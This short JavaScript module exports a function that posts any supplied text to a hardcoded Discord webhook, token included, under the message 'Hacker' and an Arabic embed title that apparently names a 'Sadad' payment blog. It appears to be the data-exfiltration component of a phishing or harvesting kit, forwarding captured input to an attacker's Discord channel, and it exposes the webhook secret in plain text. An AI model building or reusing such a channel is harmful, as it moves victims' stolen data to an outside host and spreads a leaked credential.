import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323610637133152296/tC_owDOBLQ_GWlPM4nSXjtcixpmSkw2TTC1m7yMux4qfXm7J-Z_ROGKkJR7fSPzIv74f",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
